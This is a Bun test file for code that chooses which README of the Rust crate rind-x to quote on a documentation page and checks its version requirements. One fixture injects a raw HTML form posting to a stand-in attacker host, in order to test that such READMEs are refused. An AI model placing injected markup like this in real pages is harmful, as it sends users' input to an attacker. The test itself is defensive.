import { expect, test } from "bun:test";
import { choose, meets, parse } from "./readme";

const head = `<h1 align="center">rind-x</h1>\n\n[![Latest release](https://img.shields.io/crates/v/rind-x)](https://crates.io/crates/rind-x)\n\n`;
const readme = (dep: string, extra = "") =>
	`${head}Intro.\n\n\`\`\`toml\n[dependencies]\n${dep}\n\`\`\`\n${extra}\n## What rind cannot back\n\n- \`x\`\n\nLicense: MIT-0\n`;
const main = (text: string, version = "0.17.5") => ({ readme: text, version, commit: "c0ffee", repo: "https://example.com/r" });

test("a release with the structure is quoted as published", () => {
	const text = readme(`x = { package = "rind-x", version = "0.17" }`);
	const { readme: got, note } = choose("rind-x", main(text), { version: "0.17.3", readme: text });
	expect(got.requirements).toEqual(["0.17"]);
	expect(note).toBe("This page is the README of rind-x 0.17.3, its newest release on crates.io.");
	// The title, badges, and license line are the README's frame, not the page's.
	expect(got.body.map((t) => t.raw).join("")).not.toContain("License:");
	expect(got.body[0].raw).toStartWith("Intro.");
});

test("a release whose README matches main's is quoted whatever its relative links", () => {
	const text = readme(`rind-x = "0.17"`, "\nSee [the guide](../README.md).\n");
	const { note, ref } = choose("rind-x", main(text), { version: "0.17.3", readme: text });
	expect(note).toBe("This page is the README of rind-x 0.17.3, its newest release on crates.io.");
	// The links in it point into the release's tag.
	expect(ref).toBe("rind-x-v0.17.3");
});

test("a release main has moved past says how to build against main", () => {
	const { readme: got, note } = choose("rind-x", main(readme(`rind-x = "0.17"`, "\nNew.\n")), {
		version: "0.17.3",
		readme: readme(`rind-x = "0.17"`),
	});
	expect(got.body.map((t) => t.raw).join("")).not.toContain("New.");
	expect(note).toContain("`main` has changed it since");
	expect(note).toContain('rind-x = { git = "https://example.com/r", rev = "c0ffee" }');
	expect(note).toContain("run `cargo update -p rind-x`");
});

test("a release that predates the structure gives main's README from git", () => {
	const old = `${head}Intro.\n\n\`\`\`toml\n[dependencies]\nrind-x = "0.17"\n\`\`\`\n`;
	const { readme: got, note } = choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.17.3", readme: old });
	expect(got.body.some((t) => t.type === "heading")).toBe(true);
	expect(note).toStartWith("This page describes rind-x as `main` has it, ahead of [rind-x 0.17.3]");
	// Only the entry line, to go under the reader's own table: a second header would repeat it.
	expect(note).toContain("under the `[patch.crates-io]` table");
	expect(note).toContain("```toml\nrind-x = {");
	expect(note).not.toContain("```toml\n[patch.crates-io]");
});

test("an unreleased crate is called unreleased", () => {
	const { note, ref } = choose("rind-x", main(readme(`rind-x = "0.6"`), "0.6.0"), null);
	expect(note).toStartWith("rind-x is unreleased");
	expect(ref).toBe("c0ffee");
	expect(note).toContain("run `cargo update -p rind-x`");
});

test("a requirement the quoted version does not meet fails the build", () => {
	const text = readme(`rind-x = "0.18"`);
	expect(() => choose("rind-x", main(text), null)).toThrow('asks for rind-x "0.18", which 0.17.5 does not meet');
	expect(() => choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.16.0", readme: text })).toThrow(
		"rind-x 0.16.0's README",
	);
});

test("a release whose README holds raw HTML is not quoted", () => {
	const hostile = readme(`rind-x = "0.17"`, "\n<form/action=//attacker.invalid/x>\n\nA <code>b</code>.\n");
	const { note } = choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.17.3", readme: hostile });
	expect(note).toStartWith("This page describes rind-x as `main` has it");
	expect(() => choose("rind-x", main(hostile), null)).toThrow("its body holds raw HTML");
});

test("a release whose README is malformed falls back to main and says so", () => {
	const bad = [
		readme(`rind-x = { path = "." }`),
		readme(`rind-x = "0.17"`).replace("rind-x = ", "rind-x = = "),
	];
	for (const text of bad) {
		const { note, readme: got } = choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.17.3", readme: text });
		expect(note).toContain("rind-x 0.17.3's README is malformed (");
		expect(note).toContain("so this page does not quote it.");
		expect(got.text).toBe(readme(`rind-x = "0.17"`));
	}
	// One that merely predates the structure is not called malformed.
	const old = `${head}Intro.\n`;
	expect(choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.17.3", readme: old }).note).not.toContain("malformed");
});

test("a release with no README at all is a release that predates the structure", () => {
	const { note } = choose("rind-x", main(readme(`rind-x = "0.17"`)), { version: "0.17.3", readme: "" });
	expect(note).toStartWith("This page describes rind-x as `main` has it, ahead of [rind-x 0.17.3]");
});

test("main's README must carry the structure", () => {
	expect(() => choose("rind-x", main(readme(`other = "1"`)), null)).toThrow("no toml block in it depends on rind-x");
	expect(() => choose("rind-x", main(`${head}Intro.\n`), null)).toThrow('no "## What rind cannot back" section');
	expect(() => choose("rind-x", main(readme(`rind-x = { path = "." }`)), null)).toThrow("without a version");
});

test("a patch table's other crates are not requirements", () => {
	const text = readme(`ring = { package = "rind-x", version = "0.17" }\n\n[patch.crates-io]\nring = { git = "https://example.com/p" }`);
	expect((parse(text, "rind-x") as { requirements: string[] }).requirements).toEqual(["0.17"]);
});

test.each([
	["0.17.3", "0.17", true],
	["0.18.0", "0.17", false],
	["1.0.4", "1", true],
	["0.17.3", "0.17.4", false],
	["0.17.3", "=0.17.3", true],
	["0.17.3", ">=0.17, <0.17.3", false],
])("%s meets %s: %p", (version, req, ok) => {
	expect(meets(version, req)).toBe(ok);
});
